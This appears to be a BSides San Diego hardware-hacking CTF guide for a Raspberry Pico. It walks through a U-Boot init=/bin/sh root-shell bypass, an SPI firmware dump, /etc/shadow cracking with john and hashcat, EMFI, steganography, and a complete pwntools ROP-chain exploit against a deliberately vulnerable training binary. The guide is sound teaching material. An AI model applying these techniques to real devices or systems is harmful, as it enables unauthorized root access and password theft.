# Introduction

Hello future hardware hackers! Welcome to our little Capture-the-Flag challenge. We have lots of fun mini-challenges for you to solve and hopefully lots of fun concepts that can transfer to digging into a real-world device like an IoT device! In this challenge, you will learn about the UART and SPI protocols, Electromagnetic Fault Injection (EMFI), dumping a rootfs from an embedded device, password hash cracking, ROP chain exploitation, and more!

This document will serve as either a step-by-step guide for how to solve the challenges and get the flags on the device in front of you, or a hint if you want to try tackling the challenge all on your own! At any point if you have any questions about something in particular, come by the table and we can help you! Otherwise, we hope you enjoy the challenge and learn something new!

# Please return the Pico!

The Raspberry Picos are the property of BSides San Diego and are not yours to keep. Please return them to the hardware hacking table when you are done. These devices are what make it possible for us to keep building fun and hands-on CTF challenges like this one for the community, and returning them means the next person gets the same opportunity to learn these cool new skills you are about to learn. We would love to bring something even cooler next year and spread the knowledge even further. We really appreciate it!

# What is this thing?

So, you have this device in front of you. Some of you may already recognize it, some of you may have no idea what it is. This is the Raspberry Pico, version 1. Its an older version with the rp2040 microcontroller, not quite as powerful as its successor (the RP2350) but still impressive! You can do lots of really cool things with this microcontroller and its extremely low cost! You can program in assembly, C, C++, Rust, Go, MicroPython, and even TensorFlow Lite can run on this microcontroller! 
But lets pretend for a second that you don't have this guide and that you have NO CLUE what is running on this device. That is where your google skills come into play! 

## Challenge 0

Can you find the `datasheet` for the microcontroller on google? What interesting device specifications can you find? How many KB for sram does it have? Does it have internal or external flash capabilities? What architecture is this device running? What kind of peripherals can it use? 

Of course, the RP2040 is widely known and information is easily available online. However, you may not always be so lucky! Practicing your googling skills for datasheets and recording all the information you can about the microcontroller, SOC, storage mediums, and more is vital as a hardware hacker! 

# UART

## What is it? 

UART stands for Universal Asynchronous Receiver-Transmitter. UART is a serial communication protocol that is used for exchanging data between two different devices. UART is one of the simplest communication protocols using only two wires, one for transmitting data and another for receiving data, plus a third wire to ground the connection between the two devices. 

## Where is it used?

UART was invented in the 1960's and first used in 1971 by Western Digital! It is considered to be one of the earliest serial protocols and used in devices you probably have used or know about all the time such as RS-232 interfaces, modems, and the raspberry pico sitting in front of you. Over the years, SPI and I2C have been slowly replacing UART when communicating between chips and components, and serial ports on modern computers now use Ethernet or USB. However, UART is still widely used for its simplicity, low-cost, and easy to implement. 

## Communication Speed

The advantages of UART is that it is asynchronous, meaning the transmitter and receive do not share a common clock signal unlike that of SPI (something we will talk about later). This does simplify the protocol, but does require a transmission speed to be places on both ends of communication in order for the devices to communicate successfully. This is where the Baud rate comes into the discussion. We won't dive too deeply into Baud rate, but high level it represents the speed of serial communication, often equating to bits per second (bps). The most common baud rates UART uses today are 4800, 9600, and 115200. However, baud rates are not limited to these values and can range from a list found online to even crazy rates like 6767. 

There is a lot more advanced information you can learn about UART, such as the start and stop bits, data bits, parity bits, and more - however, for our simple challenge this should be enough basic information to get you started. If you find this protocol fascinating, I highly suggest doing your own research online as there are tons of online resources to become a UART expert. 

## Challenge 1 - UART

On the Pico in front of you, we have simulated a real-world UART scenario. Hook up to the UART interface (`GPIO 4` TX, `GPIO 5` RX, baud rate `115200`) and open a connection with `minicom`. Watch the boot output carefully - you will have a short window to act. If you can interrupt the boot process in time, you will get the flag!

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through everything you need to know.

---

### Finding UART on a Real-World Target

So now that you know what UART is, how do you actually find it on a real device? On a real-world target like an IoT device or embedded system, UART is usually exposed as a set of three or four breakout pads or headers on the PCB. These are small solder pads or pin headers that the manufacturer left on the board, sometimes for debugging purposes during development and sometimes just never bothered to remove before shipping. Lucky for us!

These pads are sometimes labeled directly on the PCB silkscreen with `RX`, `TX`, `GND`, and occasionally `VCC`. Other times they aren't labeled at all, which is where a multimeter comes in handy to identify ground and figure out which pads are which. A good rule of thumb is to look for groups of three or four pads close together, often near the edge of the board or close to the main processor. If you see something like that, there is a good chance you found yourself a UART interface!

### Hooking Up to UART

Once you have identified the UART pads, you need something to actually read the data coming out of the device. The most common tool for this is a USB-to-UART adapter (also called a USB-to-TTL adapter or FTDI adapter). These are dirt cheap and you can find them all over the place online.

Now here is the part that trips people up the first time - the wiring is crossed. Remember, UART has a transmit (TX) and a receive (RX) line. The TX on the device sends data out, and the RX on the device receives data in. So when you hook up your adapter, you connect the device's `TX` to your adapter's `RX`, and the device's `RX` to your adapter's `TX`. You also connect `GND` to `GND`. If you wire TX to TX and RX to RX nothing will work and you will be very confused, so don't do that!

Once you are wired up, you can use `minicom` on Linux to open up a serial connection and start reading the output. The command looks something like this:

```
minicom -D /dev/ttyUSB0 -b 115200
```

The `-D` flag specifies the device (your USB-to-UART adapter, which usually shows up as `/dev/ttyUSB0` or similar) and `-b` sets the baud rate. Remember from earlier how we talked about baud rates needing to match on both ends? If you connect at the wrong baud rate you will see garbage output, so if things look garbled try a different baud rate.

### Bootloaders and Why They Matter

So you are connected, the device boots up, and you start seeing output scrolling across your terminal. What you are seeing is the bootloader output. But what exactly is a bootloader?

A bootloader is a small piece of software that runs before the main operating system or firmware loads. Its job is to initialize the hardware and then hand off execution to the main firmware or OS. On embedded Linux devices, one of the most common bootloaders you will run into is called `U-Boot`. If you ever do real-world hardware hacking on routers, cameras, or other IoT devices, you will see U-Boot constantly.

Here is where things get really interesting. A lot of manufacturers ship their devices with the bootloader completely unlocked and unprotected. This is a massive security issue because if you can interrupt the bootloader before it hands off execution to the OS, you can drop into an interactive bootloader shell. From there you can do all kinds of things - read and write memory, dump flash, and modify the boot command.

On U-Boot, the boot process is controlled by an environment variable called `bootargs` which gets passed to the kernel on startup. If a device is vulnerable, you can interrupt the boot process (usually by pressing a key or sending a character during a brief window at startup), drop into the U-Boot shell, and modify `bootargs` to pass something like `init=/bin/sh` to the kernel. This tells the kernel to launch a root shell instead of the normal init process, giving you full root access to the device without ever needing a password!

### Now Try the Challenge!

Now that you know what to look for, go back up and give it a shot!

# SPI

## What is it?

SPI stands for Serial Peripheral Interface. It is a synchronous serial communication protocol that is commonly used for short-distance communication between a microcontroller and peripheral devices like flash memory chips, SD cards, displays, and sensors. Unlike UART which only needs two data wires, SPI uses four signals to communicate, and unlike UART it is synchronous, meaning both devices share a common clock signal to stay in sync.

## Where is it used?

SPI was developed by Motorola in the mid-1980s and has been widely used ever since. You will find SPI all over the place in embedded systems - it is especially common for flash memory chips, which is exactly what makes it so interesting to us as hardware hackers. On a lot of embedded devices, the firmware is stored on an external SPI flash chip sitting right there on the PCB. If you can talk to that chip directly, you can dump the entire firmware off the device without ever needing to boot it or touch the software at all. Pretty powerful!

## How Does it Work?

SPI uses four signals:

- **MOSI** (Master Out Slave In) - data sent from the host to the peripheral
- **MISO** (Master In Slave Out) - data sent from the peripheral back to the host
- **SCLK** (Serial Clock) - the clock signal that keeps both sides in sync
- **CS** (Chip Select, sometimes called CE or SS) - tells the peripheral when to start listening

Because SPI is synchronous and uses a dedicated clock line, it can run much faster than UART. This makes it great for things like reading large firmware images off a flash chip quickly.

## Challenge 2 - SPI

The Pico in front of you has several pins exposed and it is your job to figure out which ones are the SPI pins. To narrow it down for you, the pins of interest are `GPIO 16`, `GPIO 17`, `GPIO 18`, and `GPIO 19`. Probe them with your logic analyzer, identify which signal is which, and use that to dump information off the device!

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through it.

---

### Finding SPI on a Real-World Target

Just like UART, SPI is often exposed on real-world hardware as breakout pads or pin headers on the PCB. On some devices the pins are labeled (`MOSI`, `MISO`, `CLK`, `CS`), but a lot of the time they aren't labeled at all. This is where a logic analyzer becomes your best friend.

A logic analyzer is a tool that captures and displays digital signals over time. By probing different pins while the device is running, you can watch what signals are being sent and identify which protocol they belong to. SPI has a pretty distinctive pattern - you will see a regular clock signal on one pin and data bursting in sync with it on others.

### Using a Logic Analyzer and Saleae

The logic analyzer at your station uses the Saleae software, which makes identifying protocols like SPI really straightforward. Here is the general workflow:

1. Clip your logic analyzer probes onto the pins you want to monitor
2. Open the Saleae software and start a capture while the device is running
3. Look for a pin with a regular, repeating clock signal - that is your `SCLK`
4. The data lines (`MOSI` and `MISO`) will have activity that toggles in sync with the clock
5. `CS` will be a line that goes low right before a burst of data and high again after

Once you think you have identified the pins, add an SPI analyzer in the Saleae software. Point it at your MOSI, MISO, SCLK, and CS pins and let the analyzer decode the traffic for you. If you have the right pins, you will start seeing decoded SPI data. From there you can export the data as a CSV — what you do with it next is the next challenge!

## SPI Commands and Why Datasheets Matter

This is a good time to talk about something really important - SPI is not just a wire protocol, it also has a command layer on top of it. When a microcontroller wants to read from a SPI NOR flash chip, it doesn't just start clocking and hope for the best. It sends a specific command byte first, followed by an address, and the flash chip responds accordingly. The most common read command is `0x03`, which is the standard READ command you will see across most SPI NOR flash chips. But there are many others - `0x9F` to read the chip's JEDEC ID, `0x05` to read the status register, `0x20` to erase a sector, and more.

Here is the important part though - these commands can vary depending on the manufacturer and the specific chip. Some chips have unique or vendor-specific commands that you won't find in a generic SPI reference. This is exactly why finding the datasheet for the flash chip on a real device is so critical. The datasheet will tell you the exact command set the chip supports, the timing requirements, voltage levels, and everything else you need to communicate with it properly.

And this opens up a really powerful attack technique - instead of passively sniffing traffic between the microcontroller and the flash chip, you can actually desolder or clip directly onto the flash chip itself and talk to it directly using a tool like a Bus Pirate or a Raspberry Pi. Send it a READ command yourself, clock out the entire contents of the chip, and you have a full firmware dump without the device ever needing to boot. This is one of the most common techniques used in real-world hardware hacking and it is incredibly effective, especially on devices where the firmware is not encrypted.

### Now Try the Challenge!

Now that you know what you are looking for, go back up and give it a shot!

# Parsing the SPI Dump

## Challenge 3 - CSV to Binary

Alright, so you have your CSV export from Saleae. Now what? You have a file full of decoded SPI data but you need to turn that into an actual binary file that you can work with. Your challenge is to write a script that parses the CSV, extracts the right bytes, and writes them out to a binary file. Once you have the binary, figure out what it is and how to extract it!

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through it.

---

## What is SquashFS?

SquashFS is a compressed, read-only filesystem that is extremely common in embedded Linux devices. Because embedded systems often have very limited storage, SquashFS lets manufacturers pack a full Linux filesystem into a tiny footprint by compressing everything together into a single image. When the device boots, it mounts this image and runs the filesystem right out of it.

You will run into SquashFS constantly when doing firmware analysis on real-world devices like routers, IP cameras, and other IoT hardware. It is essentially the standard way embedded Linux firmware is packaged.

## Tools

The main tool you need for working with SquashFS is `unsquashfs`, which comes as part of the `squashfs-tools` package on most Linux distros. It does exactly what it sounds like - it takes a SquashFS image and extracts the full filesystem out of it so you can poke around. The basic usage is:

```
unsquashfs spi_dump.bin
```

That will extract the filesystem into a `squashfs-root` directory in your current working directory. From there you can browse the extracted filesystem just like any other directory!

But before you can run `unsquashfs`, you need to actually get the binary file from your CSV dump. That is where your scripting skills come in.

## Parsing the CSV

When you export SPI data from Saleae as a CSV, you get a file with rows of decoded transactions. Each row has a timestamp, a packet ID, and the actual byte values transferred on MOSI and MISO. The trick is knowing which rows and which column to pull from.

In our capture, the transaction starts with a command phase - the READ command (`0x03`) plus three address bytes on MOSI, while MISO stays silent (`0x00`). After those first four rows, the data phase begins where MOSI sends dummy `0xFF` bytes to keep the clock going, and the actual rootfs data streams back on MISO. So we want to skip the first four rows and read from the MISO column.

Here is a script that does exactly that:

```python
#!/usr/bin/env python3

with open('spi_dump.csv', 'r') as f:
    content = f.readlines()[1:]  # skip header

v = b''
for c in content[4:]:  # skip READ command + 3 address bytes
    miso = c.split(',')[3].strip()
    v += int(miso, 16).to_bytes(1, 'big')

with open('spi_dump.bin', 'wb') as f:
    f.write(v)
```

Let's break down what this is doing:

- `f.readlines()[1:]` — reads all lines and skips the CSV header row
- `content[4:]` — skips the first four rows which are the command phase (`0x03` READ command + 3 address bytes). The data we actually want starts after that
- `c.split(',')[3].strip()` — splits each row by comma and grabs the fourth column, which is MISO — the data coming back from the flash chip
- `int(miso, 16).to_bytes(1, 'big')` — converts the hex value to a single byte and appends it to our output
- Finally, writes the whole thing out as `spi_dump.bin`

Once you run this and have your `spi_dump.bin`, use the `file` command on it to see what you are working with, then use `unsquashfs` to extract it!

## Identifying the Binary

Before running `unsquashfs`, a good habit is to first check what you are actually working with. Run:

```
file spi_dump.bin
```

or peek at the raw bytes with:

```
xxd spi_dump.bin | head
```

If things worked correctly you will see `hsqs` right at the start of the file. This is the SquashFS magic number - a classic identifier that tells you immediately you are looking at a SquashFS image. A lot of filesystems and file formats have magic bytes like this at the start of the file, and getting familiar with them is a really useful skill. The `file` command knows about most of them and will do the lookup for you automatically.

Once you have confirmed it is a SquashFS image, run `unsquashfs` and you should end up with a `squashfs-root` directory that looks something like this:

```
squashfs-root/
├── etc/
│   └── shadow
├── home/
│   └── haxor/
│       └── hackerman.png
├── root/
│   ├── emfi.xz
│   └── hint_readme
└── tmp/
    ├── source
    └── source.c
```

Looks like there is a lot to dig into! Each of these will be its own challenge, so keep this guide handy as we walk through them one by one.

### Now Try the Challenge!

Now that you know what you are working with, go back up and give it a shot!

# /etc/shadow - Password Hash Cracking

## Challenge 4 - Crack the Hash

You have a root filesystem. The first thing any self-respecting hacker does when they get their hands on a Linux filesystem is check `/etc/shadow`. Take a look at it and see if you can crack the password hash inside!

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through it.

---

## What is /etc/shadow?

On a Linux system, `/etc/shadow` is the file that stores password hashes for all user accounts on the system. It used to be that password hashes were stored directly in `/etc/passwd`, which is world-readable, but that was obviously a bad idea. So Linux moved the hashes into `/etc/shadow`, which is only readable by root. Of course, since we just dumped the entire filesystem off the device, root permissions are not really a concern for us!

Each line in `/etc/shadow` represents a user and follows a specific format:

```
username:$id$salt$hash:...
```

The `$id$` field tells you which hashing algorithm was used. Some common ones you will run into are:

- `$1$` — MD5
- `$5$` — SHA-256
- `$6$` — SHA-512
- `$y$` — yescrypt

Knowing the algorithm is important because it tells you how to approach cracking it.

## Password Hashing

A password hash is a one-way transformation of a password. The system never stores your actual password - it stores the hash of it. When you log in, it hashes whatever you typed and compares it to the stored hash. If they match, you are in. Because hashing is one-way, you can't just reverse the hash back to the password directly. Instead, you have to try a bunch of candidate passwords, hash each one the same way, and see if any of them match. This is called a dictionary attack or brute force attack depending on your approach.

## Tools - John the Ripper and Hashcat

The two most popular tools for cracking password hashes are `john` (John the Ripper) and `hashcat`. Both are extremely powerful and widely used in the security community.

`john` is a great starting point and can often auto-detect the hash type for you:

```
john --wordlist=/usr/share/wordlists/rockyou.txt etc/shadow
```

`hashcat` is generally faster, especially if you have a GPU, but requires you to specify the hash type with a mode number. For SHA-512 hashes the mode is `1800`:

```
hashcat -m 1800 -a 0 <hash> /usr/share/wordlists/rockyou.txt
```

Both tools work by running through a wordlist — a big list of common passwords — hashing each one, and checking for a match. The most commonly used wordlist is `rockyou.txt`, which contains over 14 million real passwords leaked from a data breach back in 2009. You would be surprised how many people still use passwords from that list!

### Now Try the Challenge!

Now that you know what you are looking at, go crack that hash!

# /root/emfi.xz - The Onion

## Challenge 5 - Peel the Onion

Head over to the `root` directory in your extracted filesystem. There is a file called `emfi.xz` sitting there waiting for you. Your challenge is to extract it. Sounds simple enough, right? Well... not quite. Keep extracting and see how far you get!

Also make sure to check the `hint_readme` file in the same directory — it might come in handy.

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through it.

---

## Compression Formats

Compression is everywhere in embedded systems. Manufacturers compress files to save space, compress firmware images before flashing, and compress logs to save storage. As a hardware hacker you will constantly be unwrapping compressed files to get to what is inside. The tricky part is that there are a lot of different compression formats out there and they all have different tools and file extensions. Here are the most common ones you will run into:

| Format      | Extension          | Tool                   |
| ----------- | ------------------ | ---------------------- |
| XZ          | `.xz`              | `xz -d file.xz`        |
| Gzip        | `.gz`              | `gzip -d file.gz`      |
| Bzip2       | `.bz2`             | `bunzip2 file.bz2`     |
| Zip         | `.zip`             | `unzip file.zip`       |
| Tar         | `.tar`             | `tar xf file.tar`      |
| Tar + Gzip  | `.tar.gz` / `.tgz` | `tar xzf file.tar.gz`  |
| Tar + Bzip2 | `.tar.bz2`         | `tar xjf file.tar.bz2` |

The most important habit to build is using the `file` command at every step. Just because something has a `.tar` extension does not mean it actually is a tar file — and after you extract one layer, the thing underneath might be something completely different. Let `file` tell you what you are actually dealing with before reaching for a tool:

```
file emfi.xz
```

## Peeling the Layers

The file you are looking at is not just a single compressed file — it is a bunch of compression formats wrapped around each other like an onion. Every time you extract one layer, there is another one waiting underneath. Just keep using `file` to identify the next layer and reach for the right tool.

At some point you will hit a layer that is password protected. When that happens, check the `hint_readme` and it will point you in the right direction. That password does not live in the filesystem — you are going to have to earn it!

### Now Try the Challenge!

Start peeling and see how deep the rabbit hole goes!

# EMFI - Electromagnetic Fault Injection

## Challenge 6 - Glitch It

So you hit a password protected file and the `hint_readme` sent you here. Welcome to one of the most exciting areas of hardware hacking - fault injection. Your challenge is to perform an electromagnetic fault injection (EMFI) attack on the Pico to extract the password. Come grab one of us at the table and we will show you how to do it hands-on!

Otherwise, read on to understand what is actually happening under the hood.

---

## What is EMFI?

Electromagnetic Fault Injection is a hardware attack technique where you use a burst of electromagnetic energy to disrupt the normal operation of a processor or microcontroller. The idea is that by generating a strong, brief electromagnetic pulse near a chip while it is running, you can induce voltage transients in the silicon that cause the processor to behave unexpectedly — skipping instructions, corrupting values in registers, or executing code paths it was never supposed to reach.

This might sound like science fiction but it is a very real and well-documented attack technique used by researchers and attackers alike. It has been used to bypass secure boot on consumer devices, extract cryptographic keys from hardware security modules, and defeat code protection on microcontrollers that were supposedly locked down.

## How Does it Work?

At a high level, processors execute instructions by moving electrical signals around at very precise timings. When you introduce a sudden electromagnetic pulse near the chip, it can induce small, unexpected voltages in the circuit that cause a bit flip, a skipped clock cycle, or a corrupted memory read at just the right (or wrong) moment.

In practice, EMFI is performed with a small coil of wire connected to a device that can discharge a fast, high-current pulse through it. When you hold the coil close to the target chip and fire the pulse, the changing magnetic field induces a voltage spike in the nearby circuitry. Getting the timing right is critical — too early or too late and nothing interesting happens. But if you hit the right moment during a sensitive operation, you can cause all kinds of chaos.

## What is the Pico Doing?

If you look at the firmware, the Pico is running a function called `glitch()` during boot. It runs a loop 50 times, toggling the LED and doing a simple computation with three volatile counters — `x1`, `x2`, and `x3`. After each loop it checks whether all three counters have the expected value. Under normal conditions they always will, so nothing special happens.

But here is the trick — if an electromagnetic pulse hits the chip at just the right moment during that computation, it can cause one of those increment operations to be skipped or corrupted. The counters end up with the wrong values, the check fails, and the Pico detects that a fault occurred. When that happens, it decrypts and prints the password.

You can even watch it happen in real time — the LED blinks slowly during the normal loop. If a successful glitch is detected, it switches to blinking fast. So keep an eye on the LED while you try it!

## Real World Impact

On a real embedded device, a check like this might not be a volatile counter — it could be a signature verification routine, a secure boot check, a license validation, or an authentication step. EMFI attacks have been used against all of these in the real world. The attack is particularly powerful because it is completely agnostic to the software — it does not matter how strong the cryptography is if you can just cause the processor to skip the check entirely.

This is why hardware security is so much harder than software security. You can patch a software vulnerability, but you cannot patch physics.

## Want to Try This at Home?

If this got you excited about fault injection and you want to experiment with it yourself, the good news is that accessible tools exist! Electronic Cats will have a booth here at BSides San Diego selling a tool called the **FaultyCat**, which is an affordable, open-source EMFI tool designed exactly for this kind of hardware hacking and security research. Go swing by their booth and check it out — it is a great way to get started with fault injection without needing a ton of expensive lab equipment!

### Now Try the Challenge!

Come grab us at the table and lets glitch this thing!

# /tmp/source - Buffer Overflow & ROP Chain

## Challenge 7 - Smash the Stack

Head over to `/tmp` in your extracted filesystem. You will find a binary called `source` and its corresponding `source.c`. Read the source, find the vulnerability, and exploit it to get the flag. The comments in the code might give you a hint or two!

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through it.

---

## What is a Buffer Overflow?

A buffer overflow is one of the oldest and most classic vulnerabilities in software security. It happens when a program writes more data into a fixed-size buffer than the buffer can actually hold, causing the extra bytes to spill over into adjacent memory. On the stack, this adjacent memory includes things like saved registers and — most importantly — the return address, which tells the program where to jump back to after a function finishes executing.

If an attacker can overwrite the return address with an address of their choosing, they can redirect execution to wherever they want. Historically this was used to jump directly into shellcode that the attacker smuggled in as part of the overflow. But modern systems have protections against that — specifically NX (No-Execute), which marks the stack as non-executable so you can't just run code you put there.

## What is a ROP Chain?

Return Oriented Programming (ROP) is the technique attackers developed to get around NX. Instead of injecting new code, you reuse small snippets of existing code that are already in the binary or its libraries. These snippets are called **gadgets** and they always end with a `ret` instruction. By chaining gadgets together — each one doing a tiny piece of work before returning to the next — you can build up arbitrary functionality entirely out of code that was already there, completely bypassing NX.

On x86-64 Linux, function arguments are passed in registers. The first argument goes in `RDI`, the second in `RSI`. So if you want to call a function with specific arguments, you need gadgets that let you control those registers — something like `pop rdi; ret` to load a value into RDI, and `pop rsi; ret` to load a value into RSI.

## The Vulnerability

Take a look at `source.c`. The `main` function opens `important.txt` and reads its contents into a 100-byte buffer called `value` using `fscanf`:

```c
char value[100];
FILE *fp = fopen("important.txt", "r");
fscanf(fp, "%s", value);
```

`fscanf` with `%s` does no bounds checking — it will read as many bytes as are in the file and happily overflow the buffer. If you write enough bytes into `important.txt`, you can overwrite the return address on the stack and redirect execution.

## The Target

There is a function in the binary called `cant_touch_this`. It will print the flag, but only if it is called with `magic1 == 0xdeadbeef` and `magic2 == 0xc0dec0de`. You need to build a ROP chain that sets up those arguments and then calls it.

And if you look at the source code closely, the author was very generous:

```c
// You're welcome x1
void __attribute__((used)) pop_rdi_ret() {
    __asm__("pop %rdi; ret");
}

// You're welcome x2
void __attribute__((used)) pop_rsi_ret() {
    __asm__("pop %rsi; ret");
}
```

Two ROP gadgets, gift wrapped. The binary is also not stripped, so all the function symbols are still there and easy to find.

## Finding the Offset

Before building the ROP chain you need to know exactly how many bytes it takes to reach the return address on the stack. You could do the math by hand, but the proper way to find this is with a **cyclic pattern** — a specially crafted sequence where every 4-byte substring is unique. pwntools makes this easy:

```python
from pwn import *

# Write a long cyclic pattern to important.txt
with open('important.txt', 'wb') as f:
    f.write(cyclic(2000))
```

Run the binary under `pwndbg` and let it crash. `pwndbg` is a plugin for GDB that makes binary exploitation significantly easier — it gives you a much cleaner view of registers, the stack, and memory all in one place when a crash happens. If you don't have it, we highly recommend checking it out!

```
pwndbg ./source
run
```

When it segfaults, `pwndbg` will show you a clean view of all the registers including what ended up in RIP. Grab those bytes and feed them to `cyclic_find` to get the exact offset:

```python
from pwn import *

offset = cyclic_find(0x61616174)  # replace with the bytes you see in RIP
print(offset)
```

That offset is how many bytes of padding you need before your ROP chain begins.

## Building the Exploit

Once you have the offset, your ROP chain needs to:

1. Pad `offset` bytes to reach the return address
2. Address of `pop_rdi_ret` — pops the next value into RDI
3. `0xdeadbeef` — first argument to `cant_touch_this`
4. Address of `pop_rsi_ret` — pops the next value into RSI
5. `0xc0dec0de` — second argument to `cant_touch_this`
6. Address of `cant_touch_this` — call the function

Since the binary is not stripped you can find all the addresses you need with:

```
objdump -d source | grep -A3 "pop_rdi_ret\|pop_rsi_ret\|cant_touch_this"
```

or let pwntools do it:

```python
from pwn import *

elf = ELF('./source')

pop_rdi = elf.symbols['pop_rdi_ret']
pop_rsi = elf.symbols['pop_rsi_ret']
target  = elf.symbols['cant_touch_this']

offset  = cyclic_find(0x61616174)  # replace with your RIP bytes

payload  = cyclic(offset)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xc0dec0de)
payload += p64(target)

with open('important.txt', 'wb') as f:
    f.write(payload)
```

Then just run `./source` and watch it print the flag!

### Now Try the Challenge!

The stack is not going to smash itself!

# /home/haxor/hackerman.png - Steganography

## Challenge 8 - Hidden in Plain Sight

The last file waiting for you is `hackerman.png` sitting in `/home/haxor`. It looks like a normal image, but things are not always what they seem. See if you can find what is hidden inside!

Think you can figure it out on your own? Go for it! Otherwise, read on and we will walk you through it.

---

## What is Steganography?

Steganography is the practice of hiding secret information inside an ordinary, innocent-looking file. Unlike encryption which scrambles data so it can't be read, steganography tries to hide the fact that there is any secret data at all. The carrier file — an image, audio file, video, or even plain text — looks completely normal to anyone who is not looking for it.

Images are one of the most common carriers for steganography. PNG files in particular are interesting because they support an **alpha channel** — a fourth channel alongside the red, green, and blue channels that controls pixel transparency. Most tools and viewers display images based on the RGB channels and largely ignore subtle manipulation of the alpha values, making it a convenient place to tuck away hidden data.

## Tools

There are several tools you can use to detect and extract steganographic data from images. `zsteg` is one of the best for PNG files — it automatically scans through various bit planes and channels looking for hidden data and is great at detecting flags and text hidden in LSB (Least Significant Bit) steganography:

```
zsteg -a hackerman.png
```

If `zsteg` surfaces something interesting, it will tell you exactly where it found it and print the hidden data. There are other tools worth knowing about too — `steghide`, `binwalk`, and even just manually extracting and examining specific channels with Python's `Pillow` library if you want to get your hands dirty. Part of the fun of steganography challenges is figuring out where exactly the data is hidden and which tool surfaces it!

### Now Try the Challenge!

Take a good look at that image. The flag is in there somewhere!

# You Made It!

Huge congrats if you made it all the way through! You just went from poking at an unknown microcontroller to dumping a filesystem over SPI, cracking password hashes, fault injecting a chip, exploiting a binary with a ROP chain, and extracting hidden data from an image. That is a seriously impressive range of skills and we hope you had as much fun doing it as we had building it!

If this sparked an interest in hardware hacking or any of the topics covered here, keep digging — there is a whole world of devices out there waiting to be taken apart.

## One Last Thing - Please Return the Pico!

Just as one final reminder, the Raspberry Picos are the property of BSides San Diego and are not yours to keep. Please return them to the hardware hacking table before you leave. These devices are what make it possible for us to keep building fun and hands-on CTF challenges like this one for the community, and returning them means the next person gets the same opportunity to learn these cool new skills that you just did. We really appreciate it!

